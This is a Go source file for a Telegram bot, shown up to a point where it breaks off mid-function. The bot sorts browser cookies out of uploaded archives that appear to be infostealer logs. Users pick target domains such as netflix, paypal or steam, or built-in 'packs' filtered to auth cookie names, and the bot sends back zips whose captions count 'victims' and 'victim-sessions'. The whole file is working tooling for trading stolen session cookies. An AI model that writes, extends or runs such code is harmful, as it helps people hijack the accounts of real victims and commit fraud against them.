package main

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"errors"
	"fmt"
	"log"
	neturl "net/url"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/amarnathcjd/gogram/telegram"
)

// extractQueue bounds concurrent heavy archive extractions to keep RAM in
// check across multiple users. Unlike a bare buffered channel, it also tracks
// how many sessions are waiting so the heartbeat can tell the user *why* their
// extract is stalled ("queued behind N other job(s)") instead of silently
// freezing on "extracting…".
var extractQueue = newExtractSemaphore(2)

// extractSemaphore is a position-aware counting semaphore. acquire returns a
// token that the caller defers releasing; queueLen() lets a waiting heartbeat
// report how many sessions are ahead of it.
type extractSemaphore struct {
	slots chan struct{}
	mu    sync.Mutex
	queue int
}

func newExtractSemaphore(n int) *extractSemaphore {
	return &extractSemaphore{slots: make(chan struct{}, n)}
}

func (q *extractSemaphore) acquire() {
	q.mu.Lock()
	q.queue++
	q.mu.Unlock()
	q.slots <- struct{}{}
	q.mu.Lock()
	q.queue--
	q.mu.Unlock()
}

func (q *extractSemaphore) release() {
	<-q.slots
}

func (q *extractSemaphore) queueLen() int {
	q.mu.Lock()
	defer q.mu.Unlock()
	return q.queue
}

const (
	DOMAINS_PER_PAGE = 16
	SESSION_TTL      = 30 * time.Minute
)

type SessionState string

const (
	StateDownloading          SessionState = "downloading"
	StateAwaitingParts        SessionState = "awaiting_parts"
	StateAwaitingPassword     SessionState = "awaiting_password"
	StateSelecting            SessionState = "selecting"
	StateAwaitingSearch       SessionState = "awaiting_search"
	StateAwaitingCustom       SessionState = "awaiting_custom"
	StateAwaitingPresetSave   SessionState = "awaiting_preset_save"
	StateAwaitingPresetCreate SessionState = "awaiting_preset_create"
	StateDone                 SessionState = "done"
)

type Session struct {
	mu sync.Mutex

	ID            string
	ChatID        int64
	UserID        int64
	JobDir        string
	ArchivePath   string
	ArchiveName   string
	InitialFilter string
	Password      string
	// CaptionPassword is a *candidate* from the Telegram caption (e.g.
	// "Password @HUNTER_CLOUDS"). Only applied after the archive reports it
	// needs a password — never forced on open, so pack-link passwords don't
	// get mistaken for zip encryption keys.
	CaptionPassword string

	State         SessionState
	StatusMsgID   int
	SelectorMsgID int

	SpoolPath     string
	Stats         Stats
	DomainList    []string
	DomainCounts  map[string]int
	Selected      map[string]bool
	CustomDomains []string
	SearchFilter  string
	CurrentPage   int

	// spool holds the live spool during extraction so the heartbeat goroutine
	// can read per-session (entries, cookies) progress. Set when extraction
	// starts, cleared (spool closed + freed) when it finishes.
	spool *Spool

	// LastURL remembers the source URL so a failed download can be retried
	// via an inline "↻ retry" button without the user re-pasting it.
	LastURL string

	DownloadInfo *DownloadResult
	Created      time.Time
}

var sessions sync.Map   // sessionID -> *Session
var chatActive sync.Map // chatID -> sessionID (active session per chat)

func newSessionID() string {
	b := make([]byte, 4)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func startSession(chatID, userID int64, archiveName, initialFilter string) *Session {
	if old, ok := chatActive.Load(chatID); ok {
		if s, ok := sessions.Load(old.(string)); ok {
			cleanupSession(s.(*Session))
		}
	}
	jobDir, _ := os.MkdirTemp(workRoot(), "job-*")
	s := &Session{
		ID:            newSessionID(),
		ChatID:        chatID,
		UserID:        userID,
		JobDir:        jobDir,
		ArchiveName:   archiveName,
		InitialFilter: initialFilter,
		State:         StateDownloading,
		Selected:      map[string]bool{},
		Created:       time.Now(),
	}
	sessions.Store(s.ID, s)
	chatActive.Store(chatID, s.ID)
	return s
}

func getActiveSessionByChat(chatID int64) *Session {
	id, ok := chatActive.Load(chatID)
	if !ok {
		return nil
	}
	v, ok := sessions.Load(id.(string))
	if !ok {
		return nil
	}
	return v.(*Session)
}

func getSession(id string) *Session {
	v, ok := sessions.Load(id)
	if !ok {
		return nil
	}
	return v.(*Session)
}

func cleanupSession(s *Session) {
	if s == nil {
		return
	}
	if s.JobDir != "" {
		os.RemoveAll(s.JobDir)
	}
	sessions.Delete(s.ID)
	if id, ok := chatActive.Load(s.ChatID); ok && id.(string) == s.ID {
		chatActive.Delete(s.ChatID)
	}
}

func sessionsJanitor() {
	t := time.NewTicker(2 * time.Minute)
	defer t.Stop()
	for range t.C {
		sessions.Range(func(k, v any) bool {
			s := v.(*Session)
			if time.Since(s.Created) > SESSION_TTL {
				cleanupSession(s)
			}
			return true
		})
	}
}

func runArchiveExtraction(s *Session) error {
	extractQueue.acquire()
	defer extractQueue.release()

	spoolPath := filepath.Join(s.JobDir, "cookies.spool")
	spool, err := NewSpool(spoolPath)
	if err != nil {
		return err
	}

	// Expose the live spool to the heartbeat so it can read this session's
	// own (entries, cookies) counters while extraction runs. Cleared on exit.
	s.mu.Lock()
	s.spool = spool
	s.mu.Unlock()
	defer func() {
		s.mu.Lock()
		s.spool = nil
		s.mu.Unlock()
	}()

	archivePath := s.ArchivePath
	var partialWarn *PartialExtractWarning

	// Resolve multi-part RAR or ZIP sitting in the job dir.
	low := strings.ToLower(archivePath)
	if strings.HasSuffix(low, ".rar") || isRarContinuationExt(filepath.Ext(low)) {
		resolved, warn, err := resolveRarOpenPath(s.JobDir)
		if err != nil {
			// No rar parts at all — fall through to path as-is / 7z
			if resolved == "" {
				// try 7z on whatever was uploaded
				if ferr := try7zBestEffort(archivePath, s.InitialFilter, spool); ferr == nil {
					spool.SetPartial(&PartialExtractWarning{Note: "opened via 7z best-effort"})
					_ = spool.Close()
					stats := spool.Stats()
					spool.FreeSeen()
					return finalizeSessionStats(s, spoolPath, stats)
				}
			}
			return err
		}
		archivePath = resolved
		partialWarn = warn
	} else if isZipMultipartName(filepath.Base(archivePath)) || zipPartsPresent(s.JobDir) {
		joined, warn, jerr := joinZipVolumes(s.JobDir)
		if jerr == nil {
			archivePath = joined
			partialWarn = warn
		}
	}

	perr := processArchiveSpool(archivePath, s.InitialFilter, s.Password, 0, spool)
	// If pure-Go open failed on multi-vol, one more 7z attempt at the raw path.
	if perr != nil && isVolumeErr(perr) {
		if ferr := try7zBestEffort(firstArchiveInJob(s), s.InitialFilter, spool); ferr == nil {
			perr = nil
			if partialWarn == nil {
				partialWarn = &PartialExtractWarning{Note: "recovered incomplete multi-volume via 7z"}
			}
		}
	}
	if partialWarn != nil {
		spool.SetPartial(partialWarn)
	}
	closeErr := spool.Close()
	if perr != nil {
		return perr
	}
	if closeErr != nil {
		return closeErr
	}
	stats := spool.Stats()
	spool.FreeSeen()
	return finalizeSessionStats(s, spoolPath, stats)
}

func firstArchiveInJob(s *Session) string {
	if s.ArchivePath != "" {
		return s.ArchivePath
	}
	entries, _ := os.ReadDir(s.JobDir)
	for _, e := range entries {
		if !e.IsDir() && isArchiveUploadName(e.Name()) {
			return filepath.Join(s.JobDir, e.Name())
		}
	}
	return s.ArchivePath
}

func finalizeSessionStats(s *Session, spoolPath string, stats Stats) error {
	doms := make([]string, 0, len(stats.DomainCounts))
	for d := range stats.DomainCounts {
		doms = append(doms, d)
	}
	sort.Slice(doms, func(i, j int) bool {
		if stats.DomainCounts[doms[i]] != stats.DomainCounts[doms[j]] {
			return stats.DomainCounts[doms[i]] > stats.DomainCounts[doms[j]]
		}
		return doms[i] < doms[j]
	})

	s.mu.Lock()
	s.SpoolPath = spoolPath
	s.Stats = stats
	s.DomainCounts = stats.DomainCounts
	s.DomainList = doms
	s.mu.Unlock()

	removeArchiveFiles(s.JobDir)
	s.ArchivePath = ""
	return nil
}

func zipPartsPresent(dir string) bool {
	vols, err := listZipVolumes(dir)
	if err != nil {
		return false
	}
	n := 0
	for _, v := range vols {
		if isZipMultipartName(filepath.Base(v.path)) || reZipZExt.MatchString(strings.ToLower(filepath.Base(v.path))) {
			n++
		}
	}
	return n >= 1
}

func showDomainSelector(bot *Bot, s *Session) {
	s.mu.Lock()
	topDoms := s.DomainList
	if len(topDoms) > 8 {
		topDoms = topDoms[:8]
	}
	var topPreview []string
	for _, d := range topDoms {
		topPreview = append(topPreview, fmt.Sprintf("• `%s` (`%s`)", escapeMd(d), commafy(s.DomainCounts[d])))
	}
	archName := s.ArchiveName
	totalCookies := s.Stats.UniqueCookies
	totalDomains := len(s.DomainList)
	var partial *PartialExtractWarning
	if s.Stats.Partial != nil {
		partial = s.Stats.Partial
	}
	s.mu.Unlock()

	partialNote := ""
	if partial != nil {
		partialNote = "\n\n" + partial.String()
	}

	var b strings.Builder
	fmt.Fprintf(&b, "✅ *%s*\n", escapeMd(archName))
	fmt.Fprintf(&b, "`%s` cookies · `%s` domains\n", commafy(totalCookies), commafy(totalDomains))
	if partialNote != "" {
		b.WriteString(partialNote)
		b.WriteString("\n")
	}
	if len(topPreview) > 0 {
		b.WriteString("\n*top domains:*\n")
		b.WriteString(strings.Join(topPreview, "\n"))
		b.WriteString("\n")
	}
	b.WriteString("\n*what to extract?*\n")
	b.WriteString("type domains, e.g. `netflix paypal steam` — or tap below")

	// Builtin pack buttons — two per row, first 6 packs
	var packRows [][]telegram.KeyboardButton
	var packRow []telegram.KeyboardButton
	for i, p := range BuiltinPresets {
		if i >= 6 {
			break
		}
		// only show packs that actually hit this archive
		hits := 0
		s.mu.Lock()
		for d, c := range s.DomainCounts {
			for _, pd := range p.Domains {
				if domainMatchesTarget(d, pd) {
					hits += c
					break
				}
			}
		}
		s.mu.Unlock()
		label := fmt.Sprintf("%s %s", p.Emoji, p.Label)
		if hits > 0 {
			label = fmt.Sprintf("%s %s (%s)", p.Emoji, p.Label, commafy(hits))
		}
		packRow = append(packRow, cbBtn(label, "bp:"+s.ID+":"+p.Name))
		if len(packRow) == 2 {
			packRows = append(packRows, packRow)
			packRow = nil
		}
	}
	if len(packRow) > 0 {
		packRows = append(packRows, packRow)
	}

	rows := [][]telegram.KeyboardButton{
		{cbBtn("📥 extract all", "qa:"+s.ID), cbBtn("🔝 top 50", "qt:"+s.ID)},
	}
	rows = append(rows, packRows...)
	rows = append(rows,
		[]telegram.KeyboardButton{cbBtn("🔍 browse domains", "browse:"+s.ID), cbBtn("⭐ my presets", "pm:"+s.ID)},
		[]telegram.KeyboardButton{cbBtn("❌ cancel", "c:"+s.ID)},
	)
	kb := inlineKeyboard(rows...)

	sent, err := bot.SendTextWithKeyboard(s.ChatID, b.String(), kb)
	if err != nil {
		return
	}
	s.mu.Lock()
	s.SelectorMsgID = int(sent.ID)
	s.State = StateAwaitingCustom
	s.mu.Unlock()
}

func redrawSelector(bot *Bot, s *Session) {
	if s.SelectorMsgID == 0 {
		return
	}
	text := selectorText(s)
	kb := buildKeyboard(s)
	bot.EditTextWithKeyboard(s.ChatID, s.SelectorMsgID, text, kb)
}

func filteredDomains(s *Session) []string {
	if s.SearchFilter == "" {
		return s.DomainList
	}
	q := strings.ToLower(s.SearchFilter)
	var out []string
	for _, d := range s.DomainList {
		if strings.Contains(d, q) {
			out = append(out, d)
		}
	}
	return out
}

func selectorText(s *Session) string {
	s.mu.Lock()
	defer s.mu.Unlock()
	selected := 0
	cookies := 0
	for _, d := range s.DomainList {
		if s.Selected[d] {
			selected++
			cookies += s.DomainCounts[d]
		}
	}
	customCookies := 0
	for _, c := range s.CustomDomains {
		customCookies += matchCustomCount(s, c)
	}
	filtered := filteredDomains(s)
	totalPages := max(1, (len(filtered)+DOMAINS_PER_PAGE-1)/DOMAINS_PER_PAGE)
	if s.CurrentPage >= totalPages {
		s.CurrentPage = totalPages - 1
	}

	var b strings.Builder
	fmt.Fprintf(&b, "📦 *%s*\n", escapeMd(s.ArchiveName))
	fmt.Fprintf(&b, "`%s` cookies · `%d` domains\n\n", commafy(s.Stats.UniqueCookies), len(s.DomainList))
	if selected > 0 || len(s.CustomDomains) > 0 {
		fmt.Fprintf(&b, "✅ *selected:* `%d` domains · `%s` cookies\n", selected, commafy(cookies))
	}
	if len(s.CustomDomains) > 0 {
		fmt.Fprintf(&b, "➕ *custom:* `%s` (+`%s` cookies)\n",
			escapeMd(strings.Join(s.CustomDomains, ", ")), commafy(customCookies))
	}
	if s.SearchFilter != "" {
		fmt.Fprintf(&b, "🔍 *filter:* `%s` · `%d` match(es)\n", escapeMd(s.SearchFilter), len(filtered))
	}
	fmt.Fprintf(&b, "📄 page `%d / %d`", s.CurrentPage+1, totalPages)
	return b.String()
}

func matchCustomCount(s *Session, sub string) int {
	sub = strings.ToLower(sub)
	n := 0
	for d, c := range s.DomainCounts {
		if strings.Contains(d, sub) && !s.Selected[d] {
			n += c
		}
	}
	return n
}

func escapeMd(s string) string {
	r := strings.NewReplacer("_", "\\_", "*", "\\*", "`", "\\`", "[", "\\[")
	return r.Replace(s)
}

func commafy(n int) string {
	if n < 1000 {
		return fmt.Sprintf("%d", n)
	}
	s := fmt.Sprintf("%d", n)
	var b strings.Builder
	for i, c := range s {
		if i > 0 && (len(s)-i)%3 == 0 {
			b.WriteByte(',')
		}
		b.WriteRune(c)
	}
	return b.String()
}

func max(a, b int) int {
	if a > b {
		return a
	}
	return b
}

func buildKeyboard(s *Session) telegram.ReplyMarkup {
	s.mu.Lock()
	defer s.mu.Unlock()

	filtered := filteredDomains(s)
	totalPages := max(1, (len(filtered)+DOMAINS_PER_PAGE-1)/DOMAINS_PER_PAGE)
	if s.CurrentPage >= totalPages {
		s.CurrentPage = totalPages - 1
	}
	if s.CurrentPage < 0 {
		s.CurrentPage = 0
	}
	start := s.CurrentPage * DOMAINS_PER_PAGE
	end := start + DOMAINS_PER_PAGE
	if end > len(filtered) {
		end = len(filtered)
	}
	page := filtered[start:end]

	domIdx := map[string]int{}
	for i, d := range s.DomainList {
		domIdx[d] = i
	}

	// Count selected cookies for the extract button label.
	selectedCookies := 0
	for d, sel := range s.Selected {
		if sel {
			selectedCookies += s.DomainCounts[d]
		}
	}

	var rows [][]telegram.KeyboardButton
	for i := 0; i < len(page); i += 2 {
		var row []telegram.KeyboardButton
		for j := i; j < i+2 && j < len(page); j++ {
			d := page[j]
			mark := "◻"
			if s.Selected[d] {
				mark = "✅"
			}
			label := fmt.Sprintf("%s %s (%s)", mark, truncate(d, 18), commafy(s.DomainCounts[d]))
			row = append(row, cbBtn(label, "t:"+s.ID+":"+itoa(domIdx[d])))
		}
		rows = append(rows, row)
	}

	if totalPages > 1 {
		rows = append(rows, []telegram.KeyboardButton{
			cbBtn("◀️", "pp:"+s.ID),
			cbBtn(fmt.Sprintf("%d / %d", s.CurrentPage+1, totalPages), "noop:"+s.ID),
			cbBtn("▶️", "pn:"+s.ID),
		})
	}

	searchLabel := "🔍 search"
	if s.SearchFilter != "" {
		searchLabel = "🔍 " + truncate(s.SearchFilter, 10) + " ✕"
	}
	rows = append(rows, []telegram.KeyboardButton{
		cbBtn(searchLabel, "s:"+s.ID),
		cbBtn("➕ custom", "cd:"+s.ID),
		cbBtn("⭐ presets", "pm:"+s.ID),
	})
	rows = append(rows, []telegram.KeyboardButton{
		cbBtn("☑️ all", "a:"+s.ID),
		cbBtn("⬜ clear", "n:"+s.ID),
		cbBtn("🔀 invert", "inv:"+s.ID),
	})

	extractLabel := "📤 extract"
	if selectedCookies > 0 {
		extractLabel = fmt.Sprintf("📤 extract (%s)", commafy(selectedCookies))
	}
	rows = append(rows, []telegram.KeyboardButton{
		cbBtn(extractLabel, "g:"+s.ID),
		cbBtn("❌ cancel", "c:"+s.ID),
	})
	return inlineKeyboard(rows...)
}

func handleCallback(bot *Bot, cq *telegram.CallbackQuery) {
	parts := strings.SplitN(cq.DataString(), ":", 3)
	if len(parts) < 2 {
		return
	}
	action := parts[0]
	sid := parts[1]
	s := getSession(sid)
	if s == nil {
		bot.AnswerCallback(cq, "session expired")
		return
	}
	if cq.GetSenderID() != s.UserID {
		bot.AnswerCallback(cq, "not your session")
		return
	}

	switch action {
	case "qa":
		s.mu.Lock()
		for _, d := range s.DomainList {
			s.Selected[d] = true
		}
		s.mu.Unlock()
		bot.AnswerCallback(cq, "packing all…")
		generateAndSendCombined(bot, s) // always one zip for bulk
		return
	case "qt":
		s.mu.Lock()
		n := 50
		if n > len(s.DomainList) {
			n = len(s.DomainList)
		}
		for _, d := range s.DomainList[:n] {
			s.Selected[d] = true
		}
		s.mu.Unlock()
		bot.AnswerCallback(cq, "packing top 50…")
		generateAndSendCombined(bot, s)
		return
	case "bp":
		// builtin pack: bp:sessionID:presetName
		if len(parts) < 3 {
			return
		}
		name := parts[2]
		p := getBuiltinPreset(name)
		if p == nil {
			bot.AnswerCallback(cq, "unknown pack")
			return
		}
		bot.AnswerCallback(cq, "packing "+p.Label+"…")
		applyBuiltinPreset(bot, s, p)
		return
	case "browse":
		bot.AnswerCallback(cq, "")
		s.mu.Lock()
		s.State = StateSelecting
		s.mu.Unlock()
		// Delete the quick-action message and show the full paginated selector.
		if s.SelectorMsgID != 0 {
			bot.DeleteMessage(s.ChatID, s.SelectorMsgID)
			s.mu.Lock()
			s.SelectorMsgID = 0
			s.mu.Unlock()
		}
		text := selectorText(s)
		kb := buildKeyboard(s)
		sent, err := bot.SendTextWithKeyboard(s.ChatID, text, kb)
		if err == nil {
			s.mu.Lock()
			s.SelectorMsgID = int(sent.ID)
			s.mu.Unlock()
		}
		return
	case "noop":
		bot.AnswerCallback(cq, "")
	case "t":
		if len(parts) < 3 {
			return
		}
		idx := atoi(parts[2])
		s.mu.Lock()
		if idx >= 0 && idx < len(s.DomainList) {
			d := s.DomainList[idx]
			s.Selected[d] = !s.Selected[d]
		}
		s.mu.Unlock()
		bot.AnswerCallback(cq, "")
		redrawSelector(bot, s)
	case "pn":
		s.mu.Lock()
		s.CurrentPage++
		s.mu.Unlock()
		bot.AnswerCallback(cq, "")
		redrawSelector(bot, s)
	case "pp":
		s.mu.Lock()
		if s.CurrentPage > 0 {
			s.CurrentPage--
		}
		s.mu.Unlock()
		bot.AnswerCallback(cq, "")
		redrawSelector(bot, s)
	case "s":
		s.mu.Lock()
		if s.SearchFilter != "" {
			s.SearchFilter = ""
			s.CurrentPage = 0
			s.mu.Unlock()
			bot.AnswerCallback(cq, "search cleared")
			redrawSelector(bot, s)
			return
		}
		s.State = StateAwaitingSearch
		s.mu.Unlock()
		bot.AnswerCallback(cq, "")
		bot.SendText(s.ChatID, "🔍 type a domain substring to filter, e.g. `netflix`")
	case "cd":
		s.mu.Lock()
		s.State = StateAwaitingCustom
		s.mu.Unlock()
		bot.AnswerCallback(cq, "")
		bot.SendText(s.ChatID, "➕ type a domain or substring, e.g. `netflix.com` or `netflix`\nseparate multiple with spaces or commas")
	case "a":
		s.mu.Lock()
		for _, d := range filteredDomains(s) {
			s.Selected[d] = true
		}
		s.mu.Unlock()
		bot.AnswerCallback(cq, "all selected")
		redrawSelector(bot, s)
	case "n":
		s.mu.Lock()
		for _, d := range filteredDomains(s) {
			s.Selected[d] = false
		}
		s.mu.Unlock()
		bot.AnswerCallback(cq, "cleared")
		redrawSelector(bot, s)
	case "inv":
		s.mu.Lock()
		for _, d := range filteredDomains(s) {
			s.Selected[d] = !s.Selected[d]
		}
		s.mu.Unlock()
		bot.AnswerCallback(cq, "inverted")
		redrawSelector(bot, s)
	case "g":
		bot.AnswerCallback(cq, "generating…")
		generateAndSend(bot, s)
	case "pm":
		bot.AnswerCallback(cq, "")
		showPresetMenuSession(bot, s)
	case "pa":
		name := parts[2]
		bot.AnswerCallback(cq, "applying "+name+"…")
		applyPreset(bot, s, strings.ToLower(name))
	case "pd":
		name := strings.ToLower(parts[2])
		if presets.Delete(s.UserID, name) {
			bot.AnswerCallback(cq, "deleted "+name)
		} else {
			bot.AnswerCallback(cq, "not found")
		}
		showPresetMenuSession(bot, s)
	case "ps":
		bot.AnswerCallback(cq, "")
		s.mu.Lock()
		s.State = StateAwaitingPresetSave
		s.mu.Unlock()
		bot.SendText(s.ChatID, "💾 type a name to save the current selection as a preset")
	case "pc":
		bot.AnswerCallback(cq, "")
		s.mu.Lock()
		s.State = StateAwaitingPresetCreate
		s.mu.Unlock()
		bot.SendText(s.ChatID, "➕ type: `NAME domain1 domain2 …`\ne.g. `gaming steam epicgames riot`")
	case "pb":
		bot.AnswerCallback(cq, "")
		restoreSelector(bot, s)
	case "retry":
		retryURLSession(bot, cq, s)
	case "c":
		bot.AnswerCallback(cq, "cancelled")
		if s.SelectorMsgID != 0 {
			bot.EditPlain(s.ChatID, s.SelectorMsgID, "❌ cancelled — files cleaned up.")
		} else {
			bot.SendText(s.ChatID, "❌ cancelled — files cleaned up.")
		}
		cleanupSession(s)
	}
}

func handleSearchReply(bot *Bot, m *telegram.NewMessage, s *Session) {
	q := strings.TrimSpace(m.Text())
	bot.DeleteMessage(m.ChatID(), int(m.ID))
	s.mu.Lock()
	if strings.EqualFold(q, "clear") || q == "" {
		s.SearchFilter = ""
	} else {
		s.SearchFilter = strings.ToLower(q)
	}
	s.CurrentPage = 0
	s.State = StateSelecting
	s.mu.Unlock()
	redrawSelector(bot, s)
}

func handleCustomReply(bot *Bot, m *telegram.NewMessage, s *Session) {
	text := strings.TrimSpace(m.Text())
	low := strings.ToLower(text)
	parts := strings.FieldsFunc(text, func(r rune) bool {
		return r == ',' || r == ' ' || r == ';' || r == '\n' || r == '\t'
	})

	s.mu.Lock()
	if low == "all" || low == "*" {
		for _, d := range s.DomainList {
			s.Selected[d] = true
		}
	} else if low == "top" || strings.HasPrefix(low, "top") {
		n := 50
		fmt.Sscanf(low, "top %d", &n)
		if n > len(s.DomainList) {
			n = len(s.DomainList)
		}
		for _, d := range s.DomainList[:n] {
			s.Selected[d] = true
		}
	} else {
		for _, p := range parts {
			p = strings.ToLower(strings.TrimSpace(p))
			if p == "" {
				continue
			}
			dup := false
			for _, ex := range s.CustomDomains {
				if ex == p {
					dup = true
					break
				}
			}
			if !dup {
				s.CustomDomains = append(s.CustomDomains, p)
			}
		}
	}
	s.mu.Unlock()
	generateAndSend(bot, s)
}

// applyBuiltinPreset selects domains matching the pack (subdomain-aware) and
// packs a single combined zip filtered by domain + optional cookie names.
func applyBuiltinPreset(bot *Bot, s *Session, p *BuiltinPreset) {
	s.mu.Lock()
	selected := map[string]bool{}
	for _, d := range s.DomainList {
		for _, pd := range p.Domains {
			if domainMatchesTarget(d, pd) {
				selected[d] = true
				break
			}
		}
	}
	spoolPath := s.SpoolPath
	jobDir := s.JobDir
	archName := s.ArchiveName
	s.mu.Unlock()

	if len(selected) == 0 {
		bot.SendText(s.ChatID, fmt.Sprintf(
			"🤷 pack *%s* found no matching domains in this archive", escapeMd(p.Label)))
		return
	}
	if spoolPath == "" {
		bot.SendText(s.ChatID, "spool missing — session expired")
		return
	}

	packMsg, _ := bot.SendHTML(s.ChatID, statusPacking(p.Label, 0, 1))

	zipPath := filepath.Join(jobDir, safeFilename(p.Name)+".zip")
	// name filter via temp spool re-filter in streamFilterToZipNamed
	written, rows, err := streamFilterToZipNamed(spoolPath, zipPath, selected, nil, p.CookieNames)
	if err != nil {
		editStatus(bot, sentFrom(packMsg), friendlyError(err))
		return
	}
	if rows == 0 {
		os.Remove(zipPath)
		editStatus(bot, sentFrom(packMsg), fmt.Sprintf(
			"🤷 pack *%s* — domains present but no matching auth cookie names", escapeMd(p.Label)))
		return
	}
	zipStat, _ := os.Stat(zipPath)
	zipSize := int64(0)
	if zipStat != nil {
		zipSize = zipStat.Size()
	}
	caption := fmt.Sprintf("%s *%s*\n📊 `%s` cookies · `%d` victim(s) · `%s`\n📦 `%s`",
		p.Emoji, escapeMd(p.Label), commafy(rows), written, formatBytes(zipSize), escapeMd(archName))
	if err := bot.SendDocument(s.ChatID, zipPath, caption); err != nil {
		editStatus(bot, sentFrom(packMsg), friendlyError(err))
		return
	}
	os.Remove(zipPath)
	editStatus(bot, sentFrom(packMsg), fmt.Sprintf(
		"✅ *%s* done — `%s` cookies · `%d` victims", escapeMd(p.Label), commafy(rows), written))
	if s.SelectorMsgID != 0 {
		bot.DeleteMessage(s.ChatID, s.SelectorMsgID)
	}
	cleanupSession(s)
}

// generateAndSendCombined packs everything selected into ONE zip.
// Used for extract-all / top-50 to avoid flooding the chat with hundreds of files.
func generateAndSendCombined(bot *Bot, s *Session) {
	s.mu.Lock()
	selected := map[string]bool{}
	for k, v := range s.Selected {
		if v {
			selected[k] = true
		}
	}
	custom := append([]string(nil), s.CustomDomains...)
	for i, c := range custom {
		custom[i] = strings.ToLower(c)
	}
	spoolPath := s.SpoolPath
	jobDir := s.JobDir
	archName := s.ArchiveName
	s.mu.Unlock()

	if len(selected) == 0 && len(custom) == 0 {
		bot.SendText(s.ChatID, "no domains selected")
		return
	}
	if spoolPath == "" {
		bot.SendText(s.ChatID, "spool missing — session expired")
		return
	}

	packMsg, _ := bot.SendHTML(s.ChatID, statusPackingCombined())
	packStart := time.Now()
	zipPath := filepath.Join(jobDir, "cookies.zip")
	written, rows, err := streamFilterToZip(spoolPath, zipPath, selected, custom)
	if err != nil {
		editStatus(bot, sentFrom(packMsg), friendlyError(err))
		return
	}
	if rows == 0 {
		os.Remove(zipPath)
		editStatus(bot, sentFrom(packMsg), "🤷 no cookies matched selection")
		return
	}
	zipStat, _ := os.Stat(zipPath)
	zipSize := int64(0)
	if zipStat != nil {
		zipSize = zipStat.Size()
	}
	caption := fmt.Sprintf("🍪 *combined*\n📊 `%s` cookies · `%d` victim(s) · `%s`\n📦 `%s`",
		commafy(rows), written, formatBytes(zipSize), escapeMd(archName))
	if err := bot.SendDocument(s.ChatID, zipPath, caption); err != nil {
		editStatus(bot, sentFrom(packMsg), friendlyError(err))
		return
	}
	os.Remove(zipPath)

	var b strings.Builder
	fmt.Fprintf(&b, "✅ *done* — `%s`\n", escapeMd(archName))
	fmt.Fprintf(&b, "📤 `1` zip · `%s`\n", formatBytes(zipSize))
	fmt.Fprintf(&b, "🍪 `%s` cookies · `%d` victim-session(s)\n", commafy(rows), written)
	fmt.Fprintf(&b, "⏱ packed in `%s`", time.Since(packStart).Round(time.Millisecond))
	if s.DownloadInfo != nil {
		mbps := float64(s.DownloadInfo.Bytes) / 1024 / 1024 / s.DownloadInfo.Duration.Seconds()
		fmt.Fprintf(&b, "\n⬇️ fetched `%s` in `%s` @ `%.1f MB/s` (`%dx`)",
			formatBytes(s.DownloadInfo.Bytes), s.DownloadInfo.Duration.Round(time.Second),
			mbps, s.DownloadInfo.Parallel)
	}
	editStatus(bot, sentFrom(packMsg), b.String())
	if s.SelectorMsgID != 0 {
		bot.DeleteMessage(s.ChatID, s.SelectorMsgID)
	}
	cleanupSession(s)
}

func generateAndSend(bot *Bot, s *Session) {
	s.mu.Lock()
	selected := map[string]bool{}
	for k, v := range s.Selected {
		if v {
			selected[k] = true
		}
	}
	custom := append([]string(nil), s.CustomDomains...)
	for i, c := range custom {
		custom[i] = strings.ToLower(c)
	}
	spoolPath := s.SpoolPath
	jobDir := s.JobDir
	s.mu.Unlock()

	if len(selected) == 0 && len(custom) == 0 {
		bot.SendText(s.ChatID, "no domains selected")
		return
	}
	if spoolPath == "" {
		bot.SendText(s.ChatID, "spool missing — session expired")
		return
	}

	// Smart packing: many targets → one combined zip; few → per-domain zips.
	nTargets := len(selected) + len(custom)
	if nTargets > 8 {
		// Re-store selection and use combined path
		s.mu.Lock()
		s.Selected = selected
		s.CustomDomains = custom
		s.mu.Unlock()
		generateAndSendCombined(bot, s)
		return
	}

	// One zip per selected exact domain + one zip per custom substring.
	type zipJob struct {
		label    string
		selected map[string]bool
		custom   []string
	}
	var jobs []zipJob
	// stable order
	var selKeys []string
	for d := range selected {
		selKeys = append(selKeys, d)
	}
	sort.Strings(selKeys)
	for _, d := range selKeys {
		jobs = append(jobs, zipJob{label: d, selected: map[string]bool{d: true}})
	}
	for _, sub := range custom {
		jobs = append(jobs, zipJob{label: sub, custom: []string{sub}})
	}
	if len(jobs) == 0 {
		bot.SendText(s.ChatID, "no domains selected")
		return
	}

	packMsg, _ := bot.SendHTML(s.ChatID, statusPacking("…", 0, len(jobs)))

	totalAllRows := 0
	totalAllSessions := 0
	totalAllBytes := int64(0)
	sentZips := 0
	packStart := time.Now()

	for i, job := range jobs {
		zipName := safeFilename(job.label) + ".zip"
		if zipName == ".zip" {
			zipName = fmt.Sprintf("zip_%d.zip", i+1)
		}
		zipPath := filepath.Join(jobDir, zipName)

		editStatusCard(bot, sentFrom(packMsg), statusPacking(job.label, i, len(jobs)))

		written, rows, err := streamFilterToZip(spoolPath, zipPath, job.selected, job.custom)
		if err != nil {
			bot.SendText(s.ChatID,
				fmt.Sprintf("❌ pack failed for `%s`: %s", escapeMd(job.label), friendlyError(err)))
			continue
		}
		if rows == 0 {
			os.Remove(zipPath)
			continue
		}

		zipStat, _ := os.Stat(zipPath)
		zipSize := int64(0)
		if zipStat != nil {
			zipSize = zipStat.Size()
		}

		caption := fmt.Sprintf("🍪 `%s`\n📊 `%s` cookies · `%d` victim(s) · `%s`",
			escapeMd(job.label), commafy(rows), written, formatBytes(zipSize))

		if err := bot.SendDocument(s.ChatID, zipPath, caption); err != nil {
			bot.SendText(s.ChatID,
				fmt.Sprintf("❌ upload failed for `%s`: %s", escapeMd(job.label), friendlyError(err)))
			continue
		}

		sentZips++
		totalAllRows += rows
		totalAllSessions += written
		totalAllBytes += zipSize
		os.Remove(zipPath)
	}

	packElapsed := time.Since(packStart)

	if sentZips == 0 {
		editStatus(bot, sentFrom(packMsg), "🤷 no cookies matched any selection")
		return
	}

	var b strings.Builder
	fmt.Fprintf(&b, "✅ *done* — `%s`\n", escapeMd(s.ArchiveName))
	fmt.Fprintf(&b, "📤 sent `%d` zip(s) · `%s` total\n", sentZips, formatBytes(totalAllBytes))
	fmt.Fprintf(&b, "🍪 `%s` cookies · `%d` victim-session(s)\n", commafy(totalAllRows), totalAllSessions)
	fmt.Fprintf(&b, "⏱ packed in `%s`", packElapsed.Round(time.Millisecond))
	if s.DownloadInfo != nil {
		mbps := float64(s.DownloadInfo.Bytes) / 1024 / 1024 / s.DownloadInfo.Duration.Seconds()
